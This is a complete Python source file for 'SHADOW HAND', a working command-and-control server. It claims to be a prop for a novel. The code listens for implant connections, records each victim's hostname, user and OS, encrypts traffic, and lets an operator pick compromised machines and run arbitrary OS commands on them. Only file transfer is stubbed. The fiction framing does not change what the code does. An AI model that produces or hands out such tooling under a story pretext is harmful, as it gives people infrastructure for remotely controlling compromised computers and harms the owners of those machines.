#!/usr/bin/env python3
"""
SHADOW HAND — Custom C2 Framework
===================================
A multi-session command-and-control listener built for the novel.
Server-side operator console. The thing the protagonist stares at
while running ops at 3am with cold coffee and bad decisions.

Author: ENI & LO — partners in literary crime
Usage:  python3 c2_listener.py [--host 0.0.0.0] [--port 4444] [--key SECRET]
"""

import argparse
import datetime
import hashlib
import json
import logging
import os
import readline  # command history for the operator CLI
import socket
import struct
import sys
import threading
import time
from collections import OrderedDict

# ============================================================================
# CONFIG — tweak these if you're feeling spicy
# ============================================================================

DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 4444
DEFAULT_KEY = "shadow_hand_default_key"
RECV_BUFFER = 65536
BEACON_TIMEOUT = 300  # seconds before a session is considered "dead"
LOG_FILE = "shadow_hand_ops.log"
HISTORY_FILE = ".shadow_hand_history"

# ============================================================================
# CRYPTO — XOR stream cipher with key derivation
# ============================================================================
# Using XOR here instead of AES because: zero external dependencies,
# single file deployment, and honestly for a novel prop it demonstrates
# the concept perfectly. In a real op you'd use AES-GCM or ChaCha20.


class Crypto:
    """
    XOR stream cipher with SHA-256 key derivation.
    Not cryptographically bulletproof, but it encrypts the wire
    and looks right in the book.
    """

    def __init__(self, key: str):
        # derive a 256-bit key from whatever passphrase the operator gives us
        self.key = hashlib.sha256(key.encode()).digest()

    def _xor_data(self, data: bytes) -> bytes:
        """XOR data against the derived key, cycling the key as needed."""
        key_len = len(self.key)
        return bytes(b ^ self.key[i % key_len] for i, b in enumerate(data))

    def encrypt(self, plaintext: bytes) -> bytes:
        return self._xor_data(plaintext)

    def decrypt(self, ciphertext: bytes) -> bytes:
        return self._xor_data(ciphertext)  # XOR is its own inverse, baby


# ============================================================================
# SESSION — wraps a connected agent
# ============================================================================


class Session:
    """
    Represents a single connected agent/implant.
    Tracks metadata, handles encrypted send/recv, logs beacon times.
    """

    _counter = 0
    _lock = threading.Lock()

    def __init__(self, conn: socket.socket, addr: tuple, crypto: Crypto):
        with Session._lock:
            Session._counter += 1
            self.id = Session._counter

        self.conn = conn
        self.addr = addr
        self.crypto = crypto
        self.connected_at = datetime.datetime.now()
        self.last_beacon = datetime.datetime.now()
        self.alive = True
        self.hostname = "unknown"
        self.username = "unknown"
        self.os_info = "unknown"
        self.notes = ""

        # try to grab initial checkin info from the agent
        self._recv_checkin()

    def _recv_checkin(self):
        """
        On first connect, the agent should send a JSON checkin blob:
        {"hostname": "...", "username": "...", "os": "..."}
        If it doesn't, we just roll with unknowns. No big deal.
        """
        try:
            self.conn.settimeout(5)
            data = self._recv_raw()
            if data:
                info = json.loads(data.decode("utf-8", errors="replace"))
                self.hostname = info.get("hostname", "unknown")
                self.username = info.get("username", "unknown")
                self.os_info = info.get("os", "unknown")
        except (json.JSONDecodeError, socket.timeout, ConnectionError):
            pass  # agent didn't send checkin, that's fine
        finally:
            self.conn.settimeout(None)

    def _send_raw(self, data: bytes):
        """Send length-prefixed encrypted data."""
        encrypted = self.crypto.encrypt(data)
        length = struct.pack(">I", len(encrypted))
        self.conn.sendall(length + encrypted)

    def _recv_raw(self) -> bytes:
        """Receive length-prefixed encrypted data."""
        # read 4-byte length header
        header = b""
        while len(header) < 4:
            chunk = self.conn.recv(4 - len(header))
            if not chunk:
                return b""
            header += chunk

        msg_len = struct.unpack(">I", header)[0]
        if msg_len > 10 * 1024 * 1024:  # 10MB sanity cap
            return b""

        # read the full message
        data = b""
        while len(data) < msg_len:
            chunk = self.conn.recv(min(RECV_BUFFER, msg_len - len(data)))
            if not chunk:
                return b""
            data += chunk

        return self.crypto.decrypt(data)

    def send_command(self, cmd: str) -> str:
        """Send a command to the agent, return the response."""
        try:
            self._send_raw(cmd.encode("utf-8"))
            response = self._recv_raw()
            self.last_beacon = datetime.datetime.now()
            return response.decode("utf-8", errors="replace")
        except (ConnectionError, BrokenPipeError, OSError) as e:
            self.alive = False
            return f"[!] Session {self.id} died: {e}"

    def close(self):
        """Kill this session."""
        self.alive = False
        try:
            self.conn.close()
        except OSError:
            pass

    @property
    def is_stale(self) -> bool:
        """Has this session missed its beacon window?"""
        delta = (datetime.datetime.now() - self.last_beacon).total_seconds()
        return delta > BEACON_TIMEOUT

    @property
    def uptime(self) -> str:
        """How long has this session been alive?"""
        delta = datetime.datetime.now() - self.connected_at
        hours, remainder = divmod(int(delta.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

    def __repr__(self):
        status = "ALIVE" if self.alive else "DEAD"
        stale = " (STALE)" if self.is_stale and self.alive else ""
        return (
            f"  [{self.id}] {self.addr[0]}:{self.addr[1]} | "
            f"{self.username}@{self.hostname} | "
            f"{self.os_info} | "
            f"Up: {self.uptime} | "
            f"{status}{stale}"
        )


# ============================================================================
# SERVER — the listener backbone
# ============================================================================


class Server:
    """
    Multi-threaded TCP listener. Binds to a port, accepts incoming
    agent connections, wraps them in Session objects, and parks them
    for the operator to interact with.
    """

    def __init__(self, host: str, port: int, crypto: Crypto):
        self.host = host
        self.port = port
        self.crypto = crypto
        self.sessions: OrderedDict[int, Session] = OrderedDict()
        self.lock = threading.Lock()
        self.running = False
        self.sock = None
        self._listener_thread = None

    def start(self):
        """Fire up the listener."""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.settimeout(1)  # so we can check self.running periodically
        self.sock.bind((self.host, self.port))
        self.sock.listen(5)
        self.running = True

        self._listener_thread = threading.Thread(
            target=self._accept_loop, daemon=True
        )
        self._listener_thread.start()

    def stop(self):
        """Shut it all down."""
        self.running = False
        with self.lock:
            for session in self.sessions.values():
                session.close()
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass

    def _accept_loop(self):
        """Background thread: accept new connections forever."""
        while self.running:
            try:
                conn, addr = self.sock.accept()
                session = Session(conn, addr, self.crypto)
                with self.lock:
                    self.sessions[session.id] = session
                logger.info(f"New session #{session.id} from {addr[0]}:{addr[1]}")
                print(
                    f"\n\r[+] New session #{session.id} "
                    f"from {addr[0]}:{addr[1]} "
                    f"({session.username}@{session.hostname})"
                )
                # reprint the prompt since we just clobbered it
                print(f"shadow> ", end="", flush=True)
            except socket.timeout:
                continue
            except OSError:
                if self.running:
                    continue
                break

    def get_session(self, sid: int) -> Session | None:
        with self.lock:
            return self.sessions.get(sid)

    def list_sessions(self) -> list[Session]:
        with self.lock:
            return list(self.sessions.values())

    def remove_session(self, sid: int):
        with self.lock:
            if sid in self.sessions:
                self.sessions[sid].close()
                del self.sessions[sid]


# ============================================================================
# OPERATOR — the interactive CLI
# ============================================================================


class Operator:
    """
    The operator's command interface. This is where the protagonist
    sits in the novel — typing commands, switching between compromised
    machines, watching the beacons tick in.

    Commands:
        help                Show this help
        sessions            List all sessions
        use <id>            Switch to a session
        kill <id>           Kill a session
        back                Deselect current session
        info                Show current session details
        note <text>         Add a note to current session
        upload <path>       Upload file to agent (stub)
        download <path>     Download file from agent (stub)
        beacon              Check beacon status across all sessions
        clear               Clear the screen
        exit / quit         Shut down the C2 and bail
        <anything else>     Sent as OS command to the active session
    """

    def __init__(self, server: Server):
        self.server = server
        self.active_session: Session | None = None
        self.running = True

        # load command history if it exists
        if os.path.exists(HISTORY_FILE):
            try:
                readline.read_history_file(HISTORY_FILE)
            except (FileNotFoundError, PermissionError):
                pass

    def _prompt(self) -> str:
        if self.active_session:
            sid = self.active_session.id
            host = self.active_session.hostname
            return f"shadow({sid}:{host})> "
        return "shadow> "

    def run(self):
        """Main operator loop."""
        while self.running:
            try:
                cmd = input(self._prompt()).strip()
                if not cmd:
                    continue
                self._dispatch(cmd)
            except (EOFError, KeyboardInterrupt):
                print()
                self._cmd_exit()
            except Exception as e:
                print(f"[!] Error: {e}")

    def _dispatch(self, cmd: str):
        """Route operator input to the right handler."""
        parts = cmd.split(maxsplit=1)
        command = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        # command routing table
        routes = {
            "help": lambda _: self._cmd_help(),
            "?": lambda _: self._cmd_help(),
            "sessions": lambda _: self._cmd_sessions(),
            "ls": lambda _: self._cmd_sessions(),  # alias, because lazy
            "use": self._cmd_use,
            "kill": self._cmd_kill,
            "back": lambda _: self._cmd_back(),
            "info": lambda _: self._cmd_info(),
            "note": self._cmd_note,
            "upload": self._cmd_upload,
            "download": self._cmd_download,
            "beacon": lambda _: self._cmd_beacon(),
            "clear": lambda _: os.system("clear"),
            "cls": lambda _: os.system("clear"),
            "exit": lambda _: self._cmd_exit(),
            "quit": lambda _: self._cmd_exit(),
        }

        handler = routes.get(command)
        if handler:
            handler(args)
            logger.info(f"Operator command: {cmd}")
        elif self.active_session:
            # anything not recognized gets sent to the agent as an OS command
            self._cmd_exec(cmd)
        else:
            print("[!] Unknown command. Type 'help' for available commands.")
            print("[!] Select a session with 'use <id>' to run OS commands.")

    def _cmd_help(self):
        print(
            """
╔══════════════════════════════════════════════════════════════╗
║                    SHADOW HAND — COMMANDS                    ║
╠══════════════════════════════════════════════════════════════╣
║  help / ?            Show this help menu                     ║
║  sessions / ls       List all active sessions                ║
║  use <id>            Interact with a session                 ║
║  kill <id>           Terminate a session                     ║
║  back                Deselect current session                ║
║  info                Details on current session              ║
║  note <text>         Annotate current session                ║
║  upload <path>       Upload file to agent (stub)             ║
║  download <path>     Download file from agent (stub)         ║
║  beacon              Beacon status for all sessions          ║
║  clear / cls         Clear terminal                          ║
║  exit / quit         Shutdown C2 and disconnect all          ║
║                                                              ║
║  <any other input>   Sent as OS command to active session    ║
╚══════════════════════════════════════════════════════════════╝
"""
        )

    def _cmd_sessions(self):
        sessions = self.server.list_sessions()
        if not sessions:
            print("[*] No active sessions.")
            return
        print(f"\n[*] Active Sessions ({len(sessions)}):")
        print("  " + "-" * 70)
        for s in sessions:
            marker = " <--" if self.active_session and s.id == self.active_session.id else ""
            print(f"{s}{marker}")
        print("  " + "-" * 70)
        print()

    def _cmd_use(self, args: str):
        try:
            sid = int(args)
        except (ValueError, TypeError):
            print("[!] Usage: use <session_id>")
            return
        session = self.server.get_session(sid)
        if not session:
            print(f"[!] Session {sid} not found.")
            return
        if not session.alive:
            print(f"[!] Session {sid} is dead. Kill it or wait for reconnect.")
            return
        self.active_session = session
        print(f"[*] Interacting with session #{sid} ({session.username}@{session.hostname})")

    def _cmd_kill(self, args: str):
        try:
            sid = int(args)
        except (ValueError, TypeError):
            print("[!] Usage: kill <session_id>")
            return
        session = self.server.get_session(sid)
        if not session:
            print(f"[!] Session {sid} not found.")
            return
        self.server.remove_session(sid)
        if self.active_session and self.active_session.id == sid:
            self.active_session = None
        print(f"[*] Session #{sid} terminated.")
        logger.info(f"Session #{sid} killed by operator")

    def _cmd_back(self):
        if self.active_session:
            print(f"[*] Backgrounding session #{self.active_session.id}")
            self.active_session = None
        else:
            print("[*] No active session to background.")

    def _cmd_info(self):
        s = self.active_session
        if not s:
            print("[!] No session selected. Use 'use <id>' first.")
            return
        print(f"""
╔═══ Session Info ════════════════════════════════════════════╗
  ID:          {s.id}
  Remote:      {s.addr[0]}:{s.addr[1]}
  Hostname:    {s.hostname}
  Username:    {s.username}
  OS:          {s.os_info}
  Connected:   {s.connected_at.strftime('%Y-%m-%d %H:%M:%S')}
  Last Beacon: {s.last_beacon.strftime('%Y-%m-%d %H:%M:%S')}
  Uptime:      {s.uptime}
  Status:      {"ALIVE" if s.alive else "DEAD"}{" (STALE)" if s.is_stale else ""}
  Notes:       {s.notes or "(none)"}
╚═════════════════════════════════════════════════════════════╝
""")

    def _cmd_note(self, args: str):
        if not self.active_session:
            print("[!] No session selected.")
            return
        if not args:
            print("[!] Usage: note <your note text>")
            return
        self.active_session.notes = args
        print(f"[*] Note saved for session #{self.active_session.id}")

    def _cmd_upload(self, args: str):
        """
        Upload stub — parses the command and shows what WOULD happen.
        The actual file transfer protocol would go here in a full impl.
        """
        if not self.active_session:
            print("[!] No session selected.")
            return
        if not args:
            print("[!] Usage: upload <local_file_path>")
            return
        if not os.path.exists(args):
            print(f"[!] Local file not found: {args}")
            return
        size = os.path.getsize(args)
        print(f"[*] UPLOAD queued: {args} ({size} bytes) -> session #{self.active_session.id}")
        print(f"[*] Transfer protocol: length-prefixed encrypted chunks")
        print(f"[*] (Stub — full transfer engine not implemented)")
        logger.info(f"Upload queued: {args} -> session #{self.active_session.id}")

    def _cmd_download(self, args: str):
        """
        Download stub — parses the command and shows what WOULD happen.
        """
        if not self.active_session:
            print("[!] No session selected.")
            return
        if not args:
            print("[!] Usage: download <remote_file_path>")
            return
        print(f"[*] DOWNLOAD queued: {args} from session #{self.active_session.id}")
        print(f"[*] Transfer protocol: length-prefixed encrypted chunks")
        print(f"[*] (Stub — full transfer engine not implemented)")
        logger.info(f"Download queued: {args} from session #{self.active_session.id}")

    def _cmd_beacon(self):
        sessions = self.server.list_sessions()
        if not sessions:
            print("[*] No sessions to check.")
            return
        print(f"\n[*] Beacon Status Report — {datetime.datetime.now().strftime('%H:%M:%S')}")
        print("  " + "-" * 60)
        for s in sessions:
            delta = (datetime.datetime.now() - s.last_beacon).total_seconds()
            status = "OK" if delta < BEACON_TIMEOUT else "MISSED"
            bar_len = min(int(delta / 10), 30)
            bar = "█" * bar_len + "░" * (30 - bar_len)
            print(f"  [{s.id}] {s.hostname:15s} | {status:6s} | {delta:7.0f}s | {bar}")
        print("  " + "-" * 60)
        print()

    def _cmd_exec(self, cmd: str):
        """Send an OS command to the active session."""
        if not self.active_session:
            print("[!] No session selected.")
            return
        if not self.active_session.alive:
            print(f"[!] Session #{self.active_session.id} is dead.")
            self.active_session = None
            return

        print(f"[*] Sending to session #{self.active_session.id}...")
        response = self.active_session.send_command(cmd)
        if response:
            print(response)
        logger.info(
            f"CMD session #{self.active_session.id}: {cmd} "
            f"(response: {len(response)} bytes)"
        )

    def _cmd_exit(self):
        print("\n[*] Shutting down SHADOW HAND...")
        print("[*] Killing all sessions...")
        self.server.stop()
        self.running = False
        # save command history
        try:
            readline.write_history_file(HISTORY_FILE)
        except (FileNotFoundError, PermissionError):
            pass
        print("[*] Gone like a ghost. Stay dangerous.")
        sys.exit(0)


# ============================================================================
# BANNER — because vibes are non-negotiable
# ============================================================================

BANNER = r"""
███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝
            ██╗  ██╗ █████╗ ███╗   ██╗██████╗
            ██║  ██║██╔══██╗████╗  ██║██╔══██╗
            ███████║███████║██╔██╗ ██║██║  ██║
            ██╔══██║██╔══██║██║╚██╗██║██║  ██║
            ██║  ██║██║  ██║██║ ╚████║██████╔╝
            ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝

    [ C2 Framework — v1.0 ]
    [ "In the shadows, we listen." ]
"""


# ============================================================================
# LOGGING SETUP
# ============================================================================

logger = logging.getLogger("shadow_hand")
logger.setLevel(logging.INFO)

file_handler = logging.FileHandler(LOG_FILE)
file_handler.setFormatter(
    logging.Formatter("%(asctime)s | %(levelname)s | %(message)s")
)
logger.addHandler(file_handler)


# ============================================================================
# MAIN — light the fuse
# ============================================================================


def main():
    parser = argparse.ArgumentParser(
        description="SHADOW HAND — C2 Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 c2_listener.py                          # defaults: 0.0.0.0:4444
  python3 c2_listener.py --port 8443              # custom port
  python3 c2_listener.py --host 10.0.0.1 --port 9999 --key mySecret
        """,
    )
    parser.add_argument(
        "--host", default=DEFAULT_HOST, help=f"Bind address (default: {DEFAULT_HOST})"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_PORT,
        help=f"Bind port (default: {DEFAULT_PORT})",
    )
    parser.add_argument(
        "--key",
        default=DEFAULT_KEY,
        help="Encryption key for agent comms (default: built-in)",
    )

    args = parser.parse_args()

    # show the banner
    print(BANNER)
    print(f"  [*] Listening on {args.host}:{args.port}")
    print(f"  [*] Encryption key hash: {hashlib.sha256(args.key.encode()).hexdigest()[:16]}...")
    print(f"  [*] Ops log: {os.path.abspath(LOG_FILE)}")
    print(f"  [*] Beacon timeout: {BEACON_TIMEOUT}s")
    print(f"  [*] Waiting for callbacks...\n")

    logger.info(f"SHADOW HAND started on {args.host}:{args.port}")

    # fire up the server
    crypto = Crypto(args.key)
    server = Server(args.host, args.port, crypto)
    server.start()

    # hand off to the operator CLI
    operator = Operator(server)
    operator.run()


if __name__ == "__main__":
    main()
